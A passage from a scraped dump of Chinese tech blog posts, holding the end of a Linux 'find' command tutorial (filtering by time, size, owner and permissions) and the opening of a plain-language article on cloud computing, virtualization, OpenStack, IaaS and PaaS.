class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">mtime</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930384d1765688740-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>你可以根据文件状态更改时间 （<code>ctime</code>）、修改时间 （<code>mtime</code>） 或访问时间 （<code>atime</code>） 来执行时间过滤。 这些是在几天内，所以如果你想要更细粒度的控制，你可以表示为在几分钟内（分别是 <code>cmin</code>、<code>mmin</code> 和 <code>amin</code>）。 除非你确切地知道你想要的时间，否则你可能会在 <code>+</code> （大于）或 <code>-</code> （小于）的后面加上数字。</p>\n<p>但也许你不关心你的照片。也许你的磁盘空间不够用，所以你想在 <code>log</code> 目录下找到所有巨大的（让我们定义为“大于 1GB”）文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930384d5041801197\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind /var/log -size +1G\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930384d5041801197-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930384d5041801197-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930384d5041801197-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1G</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930384d5041801197-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>或者，也许你想在 <code>/data</code> 中找到 bcotton 拥有的所有文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930384da500418442\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind /data -owner bcotton\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930384da500418442-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930384da500418442-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930384da500418442-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">data</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">owner </span><span class=\"crayon-i\">bcotton</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930384da500418442-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>你还可以根据权限查找文件。也许你想在你的主目录中找到对所有人可读的文件，以确保你不会过度分享。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930384de904970593\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind ~ -perm -o=r\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930384de904970593-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930384de904970593-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930384de904970593-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">perm</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">o</span><span class=\"crayon-o\">=</span><span class=\"crayon-i\">r</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930384de904970593-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这篇文章只说了 <code>find</code> 能做什么的表面。将测试条件与布尔逻辑相结合可以为你提供难以置信的灵活性，以便准确找到要查找的文件。并且像 <code>-exec</code> 或 <code>-delete</code> 这样的参数，你可以让 <code>find</code> 对它发现的内容采取行动。你有任何最喜欢的 <code>find</code> 表达式么？在评论中分享它们！</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114000\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114000votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114000\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/114000/", "url_obj_id": "50e131c5200d426df175c11073a3dcc7"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/05/6a5fe11e3f98f0f2e1b80bb8e08373cf.png"], "title": "终于有人把云计算、大数据和人工智能讲明白了", "create_date": "2018/05/19 ·", "praise_num": 3, "fav_num": 9, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/popsuper1982/p/8505203.html\">刘超（popsuper1982）</a>   </div><p>我今天要讲这三个话题，一个是云计算，一个大数据，一个人工智能，我为什么要讲这三个东西呢？因为这三个东西现在非常非常的火，它们之间好像互相有关系，一般谈云计算的时候也会提到大数据，谈人工智能的时候也会提大数据，谈人工智能的时候也会提云计算。所以说感觉他们又相辅相成不可分割，如果是非技术的人员来讲可能比较难理解说这三个之间的相互关系，所以有必要解释一下。</p>\n<p>一、云计算最初是实现资源管理的灵活性</p>\n<p>我们首先来说云计算，云计算最初的目标是对资源的管理，管理的主要是计算资源，网络资源，存储资源三个方面。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/6a5fe11e3f98f0f2e1b80bb8e08373cf.png\" alt=\"\" width=\"720\" height=\"363\"></p>\n<p>1.1 管数据中心就像配电脑</p>\n<p>什么叫计算，网络，存储资源呢？就说你要买台笔记本电脑吧，你是不是要关心这台电脑什么样的CPU啊？多大的内存啊？这两个我们称为计算资源。</p>\n<p>这台电脑要能上网吧，需要有个网口可以插网线，或者有无线网卡可以连接我们家的路由器，您家也需要到运营商比如联通，移动，电信开通一个网络，比如100M的带宽，然后会有师傅弄一根网线到您家来，师傅可能会帮您将您的路由器和他们公司的网络连接配置好，这样您家的所有的电脑，手机，平板就都可以通过您的路由器上网了。这就是网络。</p>\n<p>您可能还会问硬盘多大啊？原来硬盘都很小，10G之类的，后来500G，1T，2T的硬盘也不新鲜了。(1T是1000G)，这就是存储。</p>\n<p>对于一台电脑是这个样子的，对于一个数据中心也是同样的。想象你有一个非常非常大的机房，里面堆了很多的服务器，这些服务器也是有CPU，内存，硬盘的，也是通过类似路由器的设备上网的。这个时候的一个问题就是，运营数据中心的人是怎么把这些设备统一的管理起来的呢？</p>\n<p>1.2 灵活就是想啥时要都有，想要多少都行</p>\n<p>管理的目标就是要达到两个方面的灵活性。哪两个方面呢？比如有个人需要一台很小很小的电脑，只有一个CPU，1G内存，10G的硬盘，一兆的带宽，你能给他吗？像这种这么小规格的电脑，现在随便一个笔记本电脑都比这个配置强了，家里随便拉一个宽带都要100M。然而如果去一个云计算的平台上，他要想要这个资源的时候，只要一点就有了。</p>\n<p>所以说它就能达到两个方面灵活性。</p>\n<ul>\n<li>第一个方面就是想什么时候要就什么时候要，比如需要的时候一点就出来了，这个叫做时间灵活性。</li>\n<li>第二个方面就是想要多少呢就有多少，比如需要一个很小很小的电脑，可以满足，比如需要一个特别大的空间，以云盘为例，似乎云盘给每个人分配的空间动不动就就很大很大，随时上传随时有空间，永远用不完，这个叫做空间灵活性。</li>\n</ul>\n<p>空间灵活性和时间灵活性，也即我们常说的云计算的弹性。</p>\n<p>为了解决这个弹性的问题，经历了漫长时间的发展。</p>\n<p>1.3 物理设备不灵活</p>\n<p>首先第一个阶段就是物理机，或者说物理设备时期。这个时期相当于客户需要一台电脑，我们就买一台放在数据中心里。物理设备当然是越来越牛，例如服务器，内存动不动就是百G内存，例如网络设备，一个端口的带宽就能有几十G甚至上百G，例如存储，在数据中心至少是PB级别的(一个P是1000个T，一个T是1000个G)。</p>\n<p>然而物理设备不能做到很好的灵活性。首先它不能够达到想什么时候要就什么时候要、比如买台服务器，哪怕买个电脑，都有采购的时间。突然用户告诉某个云厂商，说想要开台电脑，如果使用物理服务器，当时去采购啊就很难，如果说供应商啊关系一般，可能采购一个月，供应商关系好的话也需要一个星期。用户等了一个星期后，这时候电脑才到位，用户还要登录上去开始慢慢部署自己的应用，时间灵活性非常差。第二是空间灵活性也不行，例如上述的用户，要一个很小很小的电脑，现在哪还有这么小型号的电脑啊。不能为了满足用户只要一个G的内存是80G硬盘的，就去买一个这么小的机器。但是如果买一个大的呢，因为电脑大，就向用户多收钱，用户说他只用这么小的一点，如果让用户多付钱就很冤。</p>\n<p>1.4 虚拟化灵活多了</p>\n<p>有人就想办法了。第一个办法就是虚拟化。用户不是只要一个很小的电脑么？数据中心的物理设备都很强大，我可以从物理的CPU，内存，硬盘中虚拟出一小块来给客户，同时也可以虚拟出一小块来给其他客户，每个客户都只能看到自己虚的那一小块，其实每个客户用的是整个大的设备上其中的一小块。虚拟化的技术能使得不同的客户的电脑看起来是隔离的，我看着好像这块盘就是我的，你看这呢这块盘就是你的，实际情况可能我这个10G和您这个10G是落在同样一个很大很大的这个存储上的。</p>\n<p>而且如果事先物理设备都准备好，虚拟化软件虚拟出一个电脑是非常快的，基本上几分钟就能解决。所以在任何一个云上要创建一台电脑，一点几分钟就出来了，就是这个道理。</p>\n<p>这个空间灵活性和时间灵活性就基本解决了。</p>\n<p>1.5 虚拟世界的赚钱与情怀</p>\n<p>在虚拟化阶段，最牛的公司是Vmware，是实现虚拟化技术比较早的一家公司，可以实现计算，网络，存储的虚拟化，这家公司很牛，性能也做得非常好，然后虚拟化软件卖的也非常好，赚了好多的钱，后来让EMC(世界五百强，存储厂商第一品牌)给收购了。</p>\n<p>但是这个世界上还是有很多有情怀的人的，尤其是程序员里面，有情怀的人喜欢做一件什么事情呢？开源。这个世界上很多软件都是有闭源就有开源，源就是源代码。就是说某个软件做的好，所有人都爱用，这个软件的代码呢，我封闭起来只有我公司知道，其他人不知道，如果其他人想用这个软件，就要付我钱，这就叫闭源。但是世界上总有一些大牛看不惯钱都让一家赚了去。大牛们觉得，这个技术你会我也会，你能开发出来，我也能，我开发出来就是不收钱，把代码拿出来分享给大家，全世界谁用都可以，所有的人都可以享受到好处，这个叫做开源。</p>\n<p>比如最近蒂姆·伯纳斯·李就是个非常有情怀的人，2017年，他因“发明万维网、第一个浏览器和使万维网得以扩展的基本协议和算法”而获得2016年度的图灵奖。图灵奖就是计算机界的诺贝尔奖。然而他最令人敬佩的是，他将万维网，也就是我们常见的www的技术无偿贡献给全世界免费使用。我们现在在网上的所有行为都应该感谢他的功劳，如果他将这个技术拿来收钱，应该和比尔盖茨差不多有钱。</p>\n<p>例如在闭源的世界里有windows，大家用windows都得给微软付钱，开源的世界里面就出现了Linux。比尔盖茨靠windows，Office这些闭源的软件赚了很多钱，称为世界首富，就有大牛开发了另外一种操作系统Linux。很多人可能没有听说过Linux，很多后台的服务器上跑的程序都是Linux上的，比如大家享受双十一，支撑双十一抢购的系统，无论是淘宝，京东，考拉，都是跑在Linux上的。</p>\n<p>再如有apple就有安卓。apple市值很高，但是苹果系统的代码我们是看不到的。于是就有大牛写了安卓手机操作系统。所以大家可以看到几乎所有的其他手机厂商，里面都装安卓系统，因为苹果系统不开源，而安卓系统大家都可以用。</p>\n<p>在虚拟化软件也一样，有了Vmware，这个软件非常非常的贵。那就有大牛写了两个开源的虚拟化软件，一个叫做Xen，一个叫做KVM，如果不做技术的，可以不用管这两个名字，但是后面还是会提到。</p>\n<p>1.6 虚拟化的半自动和云计算的全自动</p>\n<p>虚拟化软件似乎解决了灵活性问题，其实不全对。因为虚拟化软件一般创建一台虚拟的电脑，是需要人工指定这台虚拟电脑放在哪台物理机上的，可能还需要比较复杂的人工配置，所以使用Vmware的虚拟化软件，需要考一个很牛的证书，能拿到这个证书的人，薪资是相当的高，也可见复杂程度。所以仅仅凭虚拟化软件所能管理的物理机的集群规模都不是特别的大，一般在十几台，几十台，最多百台这么一个规模。这一方面会影响时间灵活性，虽然虚拟出一台电脑的时间很短，但是随着集群规模的扩大，人工配置的过程越来越复杂，越来越耗时。另一方面也影响空间灵活性，当用户数量多的时候，这点集群规模，还远达不到想要多少要多少的程度，很可能这点资源很快就用完了，还得去采购。所以随着集群的规模越来越大，基本都是千台起步，动辄上万台，甚至几十上百万台，如果去查一下BAT，包括网易，包括谷歌，亚马逊，服务器数目都大的吓人。这么多机器要靠人去选一个位置放这台虚拟化的电脑并做相应的配置，几乎是不可能的事情，还是需要机器去做这个事情。</p>\n<p>人们发明了各种各样的算法来做这个事情，算法的名字叫做调度(Scheduler)。通俗一点的说，就是有一个调度中心，几千台机器都在一个池子里面，无论用户需要多少CPU，内存，硬盘的虚拟电脑，调度中心会自动在大池子里面找一个能够满足用户需求的地方，把虚拟电脑启动起来做好配置，用户就直接能用了。这个阶段，我们称为池化，或者云化，到了这个阶段，才可以称为云计算，在这之前都只能叫虚拟化。</p>\n<p>1.7 云计算的私有与公有</p>\n<p>云计算大致分两种，一个是私有云，一个是公有云，还有人把私有云和公有云连接起来称为混合云，我们暂且不说这个。私有云就是把虚拟化和云化的这套软件部署在别人的数据中心里面，使用私有云的用户往往很有钱，自己买地建机房，自己买服务器，然后让云厂商部署在自己这里，Vmware后来除了虚拟化，也推出了云计算的产品，并且在私有云市场赚的盆满钵满。所谓公有云就是虚拟化和云化软件部署在云厂商自己数据中心里面的，用户不需要很大的投入，只要注册一个账号，就能在一个网页上点一下创建一台虚拟电脑，例如AWS也即亚马逊的公有云，例如国内的阿里云，腾讯云，网易云等。</p>\n<p>亚马逊呢为什么要做公有云呢？我们知道亚马逊原来是国外比较大的一个电商，它做电商的时候也肯定会遇到类似双11的场景，在某一个时刻大家都冲上来买东西。当大家都冲上买东西的时候，就特别需要云的时间灵活性和空间灵活性。因为它不能时刻准备好所有的资源，那样太浪费了。但也不能什么都不准备，看着双十一这么多用户想买东西登不上去。所以需要双十一的时候，创建一大批虚拟电脑来支撑电商应用，过了双十一再把这些资源都释放掉去干别的。所以亚马逊是需要一个云平台的。</p>\n<p>然而商用的虚拟化软件实在是太贵了，亚马逊总不能把自己在电商赚的钱全部给了虚拟化厂商吧。于是亚马逊基于开源的虚拟化技术，如上所述的Xen或者KVM，开发了一套自己的云化软件。没想到亚马逊后来电商越做越牛，云平台也越做越牛。而且由于他的云平台需要支撑自己的电商应用，而传统的云计算厂商多为IT厂商出身，几乎没有自己的应用，因而亚马逊的云平台对应用更加的友好，迅速发展成为云计算的第一品牌，赚了很多钱。在亚马逊公布其云计算平台财报之前，人们都猜测，亚马逊电商赚钱，云也赚钱吗？后来一公布财报，发现不是一般的赚钱，仅仅去年，亚马逊AWS年营收达122亿美元，运营利润31亿美元。</p>\n<p>1.8 云计算的赚钱与情怀</p>\n<p>公有云的第一名亚马逊过得很爽，第二名Rackspace过的就一般了。没办法，这就是互联网行业的残酷性，多是赢者通吃的模式。所以第二名如果不是云计算行业的，很多人可能都没听过了。第二名就想，我干不过老大怎么办呢？开源吧。如上所述，亚马逊虽然使用了开源的虚拟化技术，但是云化的代码是闭源的，很多想做又做不了云化平台的公司，只能眼巴巴的看着亚马逊挣大钱。Rackspace把源代码一公开，整个行业就可以一起把这个平台越做越好，兄弟们大家一起上，和老大拼了。</p>\n<p>于是Rackspace和美国航空航天局合作创办了开源软件OpenStack，如图所示OpenStack的架构图，不是云计算行业的不用弄懂这个图，但是能够看到三个关键字，Compute计算，Networking网络，Storage存储。还是一个计算，网络，存储的云化管理平台。</p>\n<p>当然第二名的技术也是非常棒的，有了OpenStack之后，果真像Rackspace想象的一样，所有想做云的大企业都疯了，你能想象到的所有如雷贯耳的大型IT企业，IBM，惠普，戴尔，华为，联想等等，都疯了。原来云平台大家都想做，看着亚马逊和Vmware赚了这么多钱，眼巴巴看着没办法，想自己做一个好像难度还挺大。现在好了，有了这样一个开源的云平台OpenStack，所有的IT厂商都加入到这个社区中来，对这个云平台进行贡献，包装成自己的产品，连同自己的硬件设备一起卖。有的做了私有云，有的做了公有云，OpenStack已经成为开源云平台的事实标准。</p>\n<p>1.9 IaaS, 资源层面的灵活性</p>\n<p>随着OpenStack的技术越来越成熟，可以管理的规模也越来越大，并且可以有多个OpenStack集群部署多套，比如北京部署一套，杭州部署两套，广州部署一套，然后进行统一的管理。这样整个规模就更大了。在这个规模下，对于普通用户的感知来讲，基本能够做到想什么时候要就什么什么药，想要多少就要多少。还是拿云盘举例子，每个用户云盘都分配了5T甚至更大的空间，如果有1亿人，那加起来空间多大啊。其实背后的机制是这样的，分配你的空间，你可能只用了其中很少一点，比如说它分配给你了5个T，这么大的空间仅仅是你看到的，而不是真的就给你了，你其实只用了50个G，则真实给你的就是50个G，随着你文件的不断上传，分给你的空间会越来越多。当大家都上传，云平台发现快满了的时候(例如用了70%)，会采购更多的服务器，扩充背后的资源，这个对用户是透明的，看不到的，从感觉上来讲，就实现了云计算的弹性。其实有点像银行，给储户的感觉是什么时候取钱都有，只要不同时挤兑，银行就不会垮。</p>\n<p>这里做一个简单的总结，到了这个阶段，云计算基本上实现了时间灵活性和空间灵活性，实现了计算，网络，存储资源的弹性。计算，网络，存储我们常称为基础设施Infranstracture, 因而这个阶段的弹性称为资源层面的弹性，管理资源的云平台，我们称为基础设施服务，就是我们常听到的IaaS，Infranstracture As A Service。</p>\n<p>二、云计算不光管资源，也要管应用</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/a0c61d4ba517a89c12c4cede15076bc3.png\" alt=\"\" width=\"747\" height=\"417\"></p>\n<p>有了IaaS，实现了资源层面的弹性就够了吗？显然不是。还有应用层面的弹性。这里举个例子，比如说实现一个电商的应用，平时十台机器就够了，双十一需要一百台。你可能觉得很好办啊，有了IaaS，新创建九十台机器就可以了啊。但是90台机器创建出来是空的啊，电商应用并没有放上去啊，只能你公司的运维人员一台一台的弄，还是需要很长时间才能安装好的。虽然资源层面实现了弹性，但是没有应用层的弹性，依然灵活性是不够的。</p>\n<p>有没有方法解决这个问题呢？于是人们在IaaS平台之上又加了一层，用于管理资源以上的应用弹性的问题，这一层通常称为PaaS（Platform As A Service）。这一层往往比较难理解，其实大致分两部分，一部分我称为你自己的应用自动安装，一部分我称为通用的应用不用安装。</p>\n<p>我们先来说第一部分，自己的应用自动安装。比如电商应用是你自己开发的，除了你自己，其他人是不知道怎么安装的，比如电商应用，安装的时候需要配置支付宝或者微信的账号，才能别人在你的电商上买东西的时候，付的钱是打到你的账户里面的，除了你，谁也不知道，所以安装的过程平台帮不了忙，但是能够帮你做的自动化，你需要做一些工作，将自己的配置信息融入到自动化的安装过程中方可。比如上面的例子，双十一新创建出来的90台机器是空的，如果能够提供一个工具，能够自动在这新的90台机器上将电商应用安装好，就能够实现应用层面的真正弹性。例如Puppet, Chef, Ansible, Cloud Foundary都可以干这件事情，最新的容器技术Docker能更好的干这件事情，不做技术的可以不用管这些词。</p>\n<p>第二部分，通用的应用不用安装。所谓通用的应用，一般指一些复杂性比较高，但是大家都在用的，例如数据库。几乎所有的应用都会用数据库，但是数据库软件是标准的，虽然安装和维护比较复杂，但是无论谁安装都是一样。这样的应用可以变成标准的PaaS层的应用放在云平台的界面上。当用户需要一个数据库的时候，一点就出来了，用户就可以直接用了。有人问，既然谁安装都一个样，那我自己来好了，不需要花钱在云平台上买。当然不是，数据库是一个非常难的东西，光Oracle这家公司，靠数据库就能赚这么多钱。买Oracle也是要花很多很多钱的。然而大多数云平台会提供Mysql这样的开源数据库，又是开源，钱不需要花这么多了，但是维护这个数据库，却需要专门招一个很大的团队，如果这个数据库能够优化到能够支撑双十一，也不是一年两年能够搞定的。比如您是一个做单车的，当然没必要招一个非常大的数据库团队来干这件事情，成本太高了，应该交给云平台来做这件事情，专业的事情专业的人来自，云平台专门养了几百人维护这套系统，您只要专注于您的单车应用就可以了。</p>\n<p>要么是自动部署，要么是不用部署，总的来说就是应用层你也要少操心，这就是PaaS层的重要作用。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/dfc6140cce1cf684db2224d39e98066e.png\" alt=\"\" width=\"707\" height=\"386\"></p>\n<p>虽说脚本的方式能够解决自己的应用的部署问题，然而不同的环境千差万别，一个脚本往往在一个环境上运行正确，到另一个环境就不正确了。</p>\n<p>而容器是能更好的解决这个问题的。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/cd9897092b71aabf92adc5c09b1118f4.png\" alt=\"\" width=\"745\" height=\"369\"></p>\n<p>容器是 Container，Container另一个意思是集装箱，其实容器的思想就是要变成软件交付的集装箱。集装箱的特点，一是封装，二是标准。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/1f84674a8a323dddf41c52625d675151.png\" alt=\"\"></p>\n<p>在没有集装箱的时代，假设将货物从 A运到 B，中间要经过三个码头、换三次船。每次都要将货物卸下船来，摆的七零八落，然后搬上船重新整齐摆好。因此在没有集装箱的时候，每次换船，船员们都要在岸上待几天才能走。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/86b744aaf03b4b8cc0d2c0e39c8a37a8.png\" 